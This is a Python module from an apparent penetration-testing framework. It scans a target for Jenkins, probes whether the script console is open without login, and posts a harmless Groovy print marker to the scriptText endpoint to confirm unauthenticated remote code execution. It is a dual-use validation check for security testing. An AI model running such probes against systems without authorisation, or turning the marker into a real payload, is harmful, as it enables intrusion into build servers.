#!/usr/bin/env python3
import sys
import os
import socket
import json
import urllib.request
import urllib.error
import urllib.parse
import http.cookiejar

# Add parent directory to path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.base_module import BaseModule
from utils.colors import *


class JenkinsRCEModule(BaseModule):
    """Jenkins Script Console Checker"""

    def __init__(self, frontdoor):
        super().__init__(frontdoor)
        self.name = "Jenkins Script Console"
        self.port = 8080

    def run(self):
        """Check Jenkins exposure and validate script execution capability."""
        module_name = "Jenkins Script Console"
        target = self.get_target()

        print(f"\n[*] Testing {target}:8080 for Jenkins...")

        ports = [8080, 8081, 8088, 8888, 9090, 808]
        for port in ports:
            if not self.check_port(port, timeout=2):
                continue

            self.log(module_name, "POTENTIAL", f"Web service on port {port}")
            self.check_jenkins_endpoints(target, port, module_name)

    def check_jenkins_endpoints(self, target, port, module_name):
        """Discover Jenkins and validate script console execution."""
        base = f"http://{target}:{port}"
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

        try:
            req = urllib.request.Request(f"{base}/login", method="GET")
            resp = opener.open(req, timeout=4)
            body = resp.read().decode("utf-8", errors="ignore").lower()
            if "jenkins" not in body and "hudson" not in body:
                return
            self.log(module_name, "INFO", f"Jenkins identified on port {port}")
        except Exception:
            return

        script_url = f"{base}/script"
        try:
            req = urllib.request.Request(script_url, method="GET")
            resp = opener.open(req, timeout=4)
            content = resp.read().decode("utf-8", errors="ignore").lower()
            if "login" in content or "signin" in content:
                self.report_validation(module_name, "Jenkins script console", False, "console requires authentication")
                return
        except urllib.error.HTTPError as e:
            if e.code in [401, 403]:
                self.report_validation(module_name, "Jenkins script console", False, f"HTTP {e.code} access denied")
            return
        except Exception as e:
            self.log(module_name, "ERROR", f"Jenkins console probe failed: {str(e)}")
            return

        self.log(module_name, "SUSPECTED", f"Script console endpoint reachable: {script_url}")
        self.validate_script_execution(base, opener, module_name)

    def validate_script_execution(self, base, opener, module_name):
        """Run a harmless Groovy marker command to confirm execution."""
        marker = "DOORKICK_VALIDATION_OK"
        payload = urllib.parse.urlencode({"script": f"println('{marker}')"}).encode("utf-8")

        crumb_field, crumb_value = self.fetch_crumb(base, opener)

        try:
            req = urllib.request.Request(f"{base}/scriptText", data=payload, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            if crumb_field and crumb_value:
                req.add_header(crumb_field, crumb_value)

            resp = opener.open(req, timeout=5)
            output = resp.read().decode("utf-8", errors="ignore")
            if marker in output:
                self.report_validation(module_name, "Unauthenticated Groovy execution", True, "scriptText executed marker payload")
                self.log(module_name, "RCE_POSSIBLE", "Jenkins accepted unauthenticated script execution")
            else:
                self.log(module_name, "SUSPECTED", "Script console reachable but marker output not observed")

        except urllib.error.HTTPError as e:
            if e.code in [401, 403]:
                self.report_validation(module_name, "Unauthenticated Groovy execution", False, f"execution blocked with HTTP {e.code}")
            else:
                self.log(module_name, "ERROR", f"Jenkins script validation HTTP error: {e.code}")
        except Exception as e:
            self.log(module_name, "ERROR", f"Jenkins script validation failed: {str(e)}")

    def fetch_crumb(self, base, opener):
        """Fetch Jenkins CSRF crumb if available."""
        try:
            req = urllib.request.Request(f"{base}/crumbIssuer/api/json", method="GET")
            resp = opener.open(req, timeout=4)
            if resp.getcode() != 200:
                return None, None

            data = json.loads(resp.read().decode("utf-8", errors="ignore"))
            return data.get("crumbRequestField"), data.get("crumb")
        except Exception:
            return None, None